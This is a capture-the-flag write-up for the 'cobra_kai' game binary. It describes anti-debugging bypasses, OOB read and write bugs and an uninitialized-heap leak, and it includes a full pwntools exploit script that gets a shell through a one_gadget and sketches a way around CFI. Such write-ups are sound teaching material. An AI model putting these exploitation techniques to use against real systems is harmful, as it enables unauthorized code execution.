# SSD December Challenge - 2 (by Juno Im of [theori](https://theori.io) - [@junorouse](https://twitter.com/junorouse))

## Introduction

This program (cobra_kai) is a Tekken game that can play with an AI computer. Users can train their character to fight with AI, save/load the game, and leave a message when they defeat the boss.

### Anti-Reverse Engineering Features

#### MSB *unknown arch 0x3e00* (SYSV)

When you open the binary with gdb, it says `"cobra_kai": not in executable format: file format not recognized.`. To bypass this, you need to patch the sixth byte (0x02) to 0x01.

```
00000000: 7f45 4c46 02 [02] 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 302c 0000 0000 0000  ..>.....0,......
00000020: 4000 0000 0000 0000 c832 0200 0000 0000  @........2......
00000030: 0000 0000 4000 3800 0a00 4000 1b00 1a00  ....@.8...@.....
```

```
juno@D-FLYINGPIG:~/aa/binary-2020-12-2/challenge$ file cobra_kai
cobra_kai: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)
vjuno@D-FLYINGPIG:~/aa/binary-2020-12-2/challenge$ vi cobra_kai
juno@D-FLYINGPIG:~/aa/binary-2020-12-2/challenge$ file cobra_kai
cobra_kai: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped
```

#### PTRACE

At 20 rounds, there is a check if the program is debugged. To bypass this, you have to change call instruction to nop (`\x90`) instruction.

```c
  if ( ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) )
  {
    _fprintf_chk(stderr, 1LL, "Tracer detected!\n");
    exit(1);
  }
```

## Vulnerabilities

### Vulnerability A - OOB Read

The following is the code when you choose the "display previous fights" feature:

```c
 _printf_chk(1LL, "Which previous fight would you like to see? Enter a slot #: ");
  _isoc99_scanf("%d", v1 - 36);
  slotIndex = *(v1 - 36);
  if ( slotIndex < 41 )                         // [1] Out of bound Read
  {
    v4 = slotIndex;
    *(v1 - 16) = *&game_data->fData[v4].is_win;
    *(v1 - 32) = *game_data->fData[v4].fighterName;
    _printf_chk(1LL, "Name to remember: %s\n", (v1 - 32));// leak function pointer
    _printf_chk(1LL, "Result: %d (duh!)\n", *(v1 - 16));
    _printf_chk(1LL, "Rounds: %d\n", *(v1 - 16));
  }
```

The part indicated by [1] does not perform range checks properly. It allows inducing PIE address leak by accessing 41st data of `fData` leak. 

### Vulnerability B - Uninitialized Data

The code to delete a user and create a new user is as follows:

```c
__int64 func_delete_main_user_impl()
{
  fighter *v0; // rax
  fighter *v1; // rbx
  fighter *v2; // rax

  puts("Ending current attempt");
  free(g_fighter);
  g_fighter = 0LL;
  puts("Creating a NEW fighter");
  v0 = malloc(0x428uLL);
  v1 = v0;
  v0->round = 0;
  *&v0->can_read_action = 0LL;
  v0->maxSlot = 40;
  *v0->gogo = 0LL;
  *&v0->characterIndex = 0LL;
  memset(v0->fData, 0, 0x3C0uLL);
  g_fighter = v1;
  _printf_chk(1LL, "Enter name: ");
  fgets(g_fighter->name, 14, stdin);
  strtok(g_fighter->name, "\n");
  _printf_chk(1LL, "Enter anger: ");
  _isoc99_scanf("%lld", g_fighter);             // [2], main_arena+96
  v2 = g_fighter;
  *&g_fighter->charm = xmmword_1B520;
  v2->strengh = 4;
  v2->func_a0x420 = end_fight;
  *v2->dummy12 = 1;
  puts("New Fighter Created!");
  return 0LL;
}
```

It uses `scanf` to read anger from a user; if you insert a plus sign(`+`) as the input value of the scanf, the value in the existing memory will be used.
It allows reading uninitialized data from the freed heap, which holds the `main_arena+96` pointer since it is in the unsorted bin.

### Vulnerability C - OOB Write

The following code is function `DD`, which used to process the game steps between AI and user:

```c
knockback_value = 3;
      if ( strength >= 129 )
      {
        v25 = rand();
        if ( v25 - 10 * (v25 / 336) == 2 )
          knockback_value = LOBYTE(a1->punch) + 3; // [3]
      }
...
      v3->characterIndex = v27 + knockback_value * (2 * (*v3->dummy12 != 1) - 1);
```

If the program satifies the following condition: `strength >= 129 && rand() % 10 == 2` (You can train strength over 129 if you defeat the boss), `knockback_value` is added to user's `punch` value [3]. The map drawing function uses `knockback_value` to draw the enemy's location with the following code:

```c
  v11 = enemy_->characterIndex;
  *&map[v11 + 0xF0] = *enemy_->data; // [4]
  *&map[v11 + 0x118] = *&enemy_->data[4]; // [4]
  *&map[v11 + 0x140] = *&enemy_->data[8]; // [4]
```

Because the map object's size is 400 bytes, out-of-bound write occurs in part marked [4].

# Exploit

If you win a fight, the program enters a win function. The win function allows you to write your name in the index after comparing it to the maxSlot variable at marked [5]:

```c
puts("Which notch on your belt will this victory go?");
  v4 = 1;
  _printf_chk(1LL, "> ");
  fgets(slotIndex, 10, stdin);
  slot_index = strtol(slotIndex, 0LL, 10);
  if ( slot_index < 0 || g_fighter->maxSlot <= slot_index ) // [5]
  {
    _printf_chk(1LL, "Bad Slot");
  }
  else
  {
    puts("What Name Shall you Remember this fighter by?");
    v4 = 0;
    _printf_chk(1LL, "> ");
    v6 = slot_index;
    fgets(&g_fighter->fData[v6], 14, stdin);
    v7 = g_fighter;
    g_fighter->fData[v6].end_round = end_round;
    v7->fData[v6].is_win = 1;
  }
```

Using out-of-bound write vulnerability, we can overwrite the maxSlot variable of the saved fighter object (`[here]`)

```asm
.bss:0000000000473DC0 ; char map[400] // map object
.bss:0000000000473DC0 map             db 190h dup(?)          ; DATA XREF: LOAD:0000000000001308↑o
.bss:0000000000473DC0                                         ; print_map+4↑w ...
.bss:0000000000473F50                 public won_by_boss
.bss:0000000000473F50 won_by_boss     dd ?                    ; DATA XREF: LOAD:0000000000001698↑o
.bss:0000000000473F50                                         ; func_lift_impl+22↑r ...
.bss:0000000000473F54                 dq ?
.bss:0000000000473F5C                 db    ? ;
.bss:0000000000473F5D                 db    ? ;
.bss:0000000000473F5E                 db    ? ;
.bss:0000000000473F5F                 db    ? ;
.bss:0000000000473F60                 public saved_fighters
.bss:0000000000473F60 ; fighter saved_fighters[8]
.bss:0000000000473F60 saved_fighters  fighter 8 dup(<?>)      ; DATA XREF: LOAD:0000000000000D20↑o // [here]
.bss:0000000000473F60                                         ; func_save_game_impl+22↑o ...
.bss:00000000004760A0                 public msg_from_mic
```

## Strategy A - Heap Fengshui With Root User

Therefore, we have out-of-bound write primitive on heap segment. Behind the fighter object on the heap, there is a ncurse_data chunk, which holds many function pointers. One of these is called inside the `endwin` function called ([6]) when you play a game. Finallay you can overwrite this value to any address and control the PC!

```c
int endwin()
{
  __int64 v0; // rax
  __int64 v1; // rdi

  v0 = HEAP_OBJ;
  if ( !HEAP_OBJ )
    return -1;
  v1 = HEAP_OBJ;
  *(HEAP_OBJ + 728) = 1;
  (*(v0 + 1088))(v1); // [6]
  sub_1AD40();
  sub_101F0();
  return reset_shell_mode();
}
```

## Script

```python
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['/mnt/c/Windows/System32/wsl.exe', '-e']
context.terminal=['cmd.exe', '/c', 'start', 'wsl.exe', '--', 'sudo', 'su', '-c']
# r = process('./cobra_kai')
r = remote('0', 2325)
# r = remote('0', 2326)
# gdb.attach(r, 'handle SIG32 nostop noprint')
r.sendafter('Enter name: ', 'a'*14)
r.sendlineafter('Enter anger: ', '1')

def play_game(st, x=False, verbose=False):
    is_first = False
    cnt = 0
    while True:
        print(cnt, end=' ')
        b = r.recv(30)
        if b'Point' in b:
            break
        _ = r.recvuntil('|--------------------------------------|')
        a = r.recvuntil('|--------------------------------------|')
        # check enemy
        if verbose:
            print(a.decode('latin-1'))
            print(a.count(b'O'), a.count(b'o'))

        if a.count(b'O') == 1 and (a.count(b'o') == 0 or a.count(b'o') != 2) and a.count(b'o') != 1:
            r.send('q')
            print('')
            return False

        data = a.split(b'\n')
        if (b'^' in a or b'.' in a or b'*' in a) and not x:
            continue

        r.send(st[cnt])
        cnt += 1

    print('')
    return True

play_game('rrrrrrrkrkrkrk')

r.sendline('')
r.sendlineafter('Which notch on your belt will this victory go?', '0')
r.sendlineafter('What Name Shall you Remember this fighter by?', 'abcd')

r.sendlineafter('>', '8')
r.sendline('40')

r.recvuntil('Name to remember: ')
pie_base = u64(r.recv(6) + b'\x00\x00') - 94624
print(f'pie_base: {hex(pie_base)}')


r.sendlineafter('>', '7')
r.sendlineafter('3. Load Game\n> ', '1')
r.sendafter('Enter name: ', 'a'*14)
r.sendlineafter('Enter anger: ', '+')

r.sendlineafter('>', '4') # quit user menu
r.sendlineafter('>', '6')

r.recvuntil('Anger: ')
main_arena_96 = int(r.recvuntil(',').replace(b',', b'').decode('latin-1')) # main_arena + 96
libc_base = main_arena_96 - 0x3c4b78
print(f'main_arena+96 : {hex(main_arena_96)}')
print(f'libc_base : {hex(libc_base)}')

X = 0
# lift
for i in range(19 + X):
    r.sendlineafter('>', '1')

r.send('q')
r.recvuntil("9. QUIT (Don't be a &(^(^)")

for i in range(19):
    r.sendlineafter('>', '1')

r.send('q')
r.recvuntil("9. QUIT (Don't be a &(^(^)")

for i in range(24):
    r.sendlineafter('>', '1')

for i in range(39 - 24):
    r.sendlineafter('>', '3')

r.send('q')
r.recvuntil("9. QUIT (Don't be a &(^(^)")

for i in range(50):
    r.sendlineafter('>', '4')
    r.sendlineafter('>', '1')
    r.sendlineafter('>', '4')
    r.sendlineafter('>', '2')
    r.sendlineafter('>', '4')
    r.sendlineafter('>', '3')

r.sendlineafter('>', '7')
r.sendlineafter('>', '2')
r.sendlineafter('Slot:', '7')

r.sendlineafter('>', '2') # fight
r.sendlineafter('>', '5')


play_game('rrrrrrrrrrrrrkrrprrdrrrdrrrprrrkdrrrdrrp'*100, x=True)
r.sendline('')
r.sendlineafter('Which notch on your belt will this victory go?', '1')
r.sendlineafter('What Name Shall you Remember this fighter by?', 'asdfsadfd')
r.sendlineafter('**Hands over the mic**', 'B'*40)

r.sendlineafter('>', '2') # fight
r.sendlineafter('>', '0')
play_game('rrrrrrkpdrkpdrkpdrkpd'*30, x=True) #, verbose=True)

r.sendline('')
r.sendlineafter('Which notch on your belt will this victory go?', '2')
r.sendlineafter('What Name Shall you Remember this fighter by?', 'asdfsadfd')

# lift

r.sendlineafter('>', '7')
r.sendlineafter('>', '2')
r.sendlineafter('Slot:', '0')

for i in range(10):
    r.sendlineafter('>', '1') # lift
    r.sendlineafter('>', '4')
    r.sendlineafter('>', '2') # punch


def make_fit():
    while True:
        r.sendlineafter('>', '4')
        r.sendlineafter('>', '2') # punch
        r.sendlineafter('>', '6')
        r.recvuntil('Punch: ')
        x = int(r.recvuntil(',').replace(b',', b'')) + 3
        x &= 0xff
        x += 0x19
        # if (x > 0xe4 and x <= 0xe4 + 3) or
        if (x > 0xbc and x <= 0xbc + 3):
            break

make_fit()

r.sendlineafter('>', '7')
r.sendlineafter('>', '2')
r.sendlineafter('Slot:', '1')

print('go...!')

context.log_level = 'error'
while True:
    print('gogo', i)
    r.sendlineafter('>', '7')
    r.sendlineafter('>', '3')
    r.sendlineafter('Slot:', '1')
    r.sendlineafter('>', '2') # fight
    r.sendlineafter('>', '1')
    if play_game('rrrrrrprrrrrrp'*30, x=True, verbose=True):
        r.sendline('')
        r.sendlineafter('Which notch on your belt will this victory go?', '0')
        r.sendlineafter('What Name Shall you Remember this fighter by?', 'asdfsadfd')
    else:
        r.sendlineafter('>', '7')
        r.sendlineafter('>', '3')
        r.sendlineafter('Slot:', '0')
        break

## heap fengsui ##

r.sendlineafter('>', '7')
r.sendlineafter('>', '1')
r.sendlineafter('Enter name: ', 'asdf')
r.sendlineafter('Enter anger: ', '3434')


'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

'''
0x56507a30d76b:      call   QWORD PTR [rdi+0x1a]
0x1f76b
'''

while True:
    print('gogo', i)
    r.sendlineafter('>', '7')
    r.sendlineafter('>', '3')
    r.sendlineafter('Slot:', '0')
    r.sendlineafter('>', '2') # fight
    r.sendlineafter('>', '1')
    if play_game('rrrrrrprrrrrrp'*30, x=True, verbose=True):
        r.sendline('')
        r.sendlineafter('Which notch on your belt will this victory go?', str(85+2)) # 0x7f39f0bbefa0 <endwin+32>    call   qword ptr [rax + 0x440] <0xa464544434241>
        # r.sendlineafter('Which notch on your belt will this victory go?', str(357914029)) # 0x7f39f0bbefa0 <endwin+32>    call   qword ptr [rax + 0x440] <0xa464544434241>
        r.sendafter('What Name Shall you Remember this fighter by?', p64(libc_base + 0x4527a)) # rsp-0x30 = null
        # r.sendafter('What Name Shall you Remember this fighter by?', p64(0x41424344)) # rsp-0x30 = null
        break

r.interactive() # press 2, ^C
context.log_level = 'debug'
first = True
while True:
    print('gogo', i)
    if not first:
        r.sendlineafter('>', '7')
        r.sendlineafter('>', '3')
        r.sendlineafter('Slot:', '0')
        r.sendlineafter('>', '2') # fight
        r.sendlineafter('>', '1')
    else:
        r.sendline('1')
        first = False

    if play_game('rrrrrrprrrrrrp'*30, x=True, verbose=True):
        r.sendline('')
        r.sendlineafter('Which notch on your belt will this victory go?', '128') # 0x7f39f0bbefa0 <endwin+32>    call   qword ptr [rax + 0x440] <0xa464544434241>
        # r.sendlineafter('Which notch on your belt will this victory go?', '357914070') # 0x7f39f0bbefa0 <endwin+32>    call   qword ptr [rax + 0x440] <0xa464544434241>
        r.sendlineafter('What Name Shall you Remember this fighter by?', p64(libc_base + 0x0000000000194feb + 8))

        break

# gdb.attach(r, 'handle SIG32 nostop noprint')
print(f'x/20gx *{hex(pie_base + 0x473F60)}')
print(f'b *{hex(pie_base + 0x14e02)}')
print(f'b *{hex(pie_base + 0x14e98)}')
print(f'b *{hex(pie_base + 0x170e1)}')

r.sendlineafter('>', '2')
r.sendlineafter('>', '1')
for i in range(20):
    r.sendline('bash')
r.interactive()
```

![](https://user-images.githubusercontent.com/8079733/103381278-ab553900-4b2e-11eb-99a5-b0b9b819eab0.png)

[*Exploit Video*](https://youtu.be/5770W0e_jOI)

# Strategy B - Universal Exploit

The offset between the `endwin` function pointer and the first of slots are different between the root user and a standard (`ctf`) user.  

**Why?**

"ncurses" allocates some terminal environment (`$HOME/.terminfo`) on the heap. For root users, the home folder is short(`/root`), but for the `ctf` user, the home folder is longer than the root user(`/home/ctf/`). It makes resulting in a difference in heap feng shui. So... overwriting the `endwin` function pointer is impossible under the `ctf` user because we only can overwrite 14 bytes at the address is 24 bytes aligned. Then, how can we exploit on standard user? I didn't figure out how to exploit it, but after the contest, jinmo123 and I find a way to exploit it universally.

**How?**

```
0000005C maxSlot         dd ?
00000060 fData           fightData 40 dup(?)
00000420 func_a0x420     dq ?
```

We can overwrite a function pointer that holds the `win` function in the fighter object. But this program has CFI mitigation to protect from the jump table pollution. The following code is the CFI mitigation code before calling the `win` function.

```asm
.text:0000000000015DA4                 mov     rax, cs:g_fighter
.text:0000000000015DAB                 mov     rcx, [rax+420h]
.text:0000000000015DB2                 lea     rax, win
.text:0000000000015DB9                 mov     rdx, rcx
.text:0000000000015DBC                 sub     rdx, rax
.text:0000000000015DBF                 rol     rdx, 3Dh
.text:0000000000015DC3                 cmp     rdx, 6; [7]
.text:0000000000015DC7                 jnb     short loc_15E09
.text:0000000000015DC9                 mov     edi, [rbp-0Ch]
.text:0000000000015DCC                 call    rcx
```

The part marked [7] uses 6, not 0, so you can use other jump tables around the `win` jump table.

```c
.text:00000000000171A0                 jmp     win_impl
.text:00000000000171A8                 jmp     check_round_impl
.text:00000000000171B0                 jmp     start_first_round_impl
.text:00000000000171B8                 jmp     func_delete_main_user_impl
.text:00000000000171C0                 jmp     func_save_game_impl
```

```c
__int64 __fastcall func_save_game_impl(unsigned int a1)
{
  _printf_chk(1LL, "Saving Game into Slot %d\n", a1);
  memcpy(&saved_fighters[a1], g_fighter, 0x428uLL);
  return 0LL;
}
```

If you look at func_save_game_impl, you can see that the current game can be saved to the first argument as an index, which holds the fighting end round. Since the `saved_fighters` object's length is 8, you can get an out-of-bound write one more!

```
.bss:0000000000473F60 saved_fighters  fighter 8 dup(<?>)      ; DATA XREF: LOAD:0000000000000D20↑o // [here]
.bss:0000000000473F60                                         ; func_save_game_impl+22↑o ...
.bss:00000000004760A0                 public msg_from_mic
```

There is a pointer behind the `saved_fighters` object that can be written after you defeat the boss, finally overwriting this pointer allows you to write everything on any addresses! (the first offset of the game object is an anger value, which can make it anything when you make a new character[=fighter])
